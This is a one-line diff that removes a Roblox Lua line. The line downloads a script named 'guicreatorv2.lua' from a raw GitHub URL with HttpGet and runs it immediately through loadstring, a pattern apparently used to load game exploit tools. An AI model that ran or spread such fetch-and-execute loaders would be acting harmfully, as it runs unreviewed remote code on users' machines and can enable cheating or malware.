@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/swqely/uscripts/main/guicreatorv2.lua",true))()
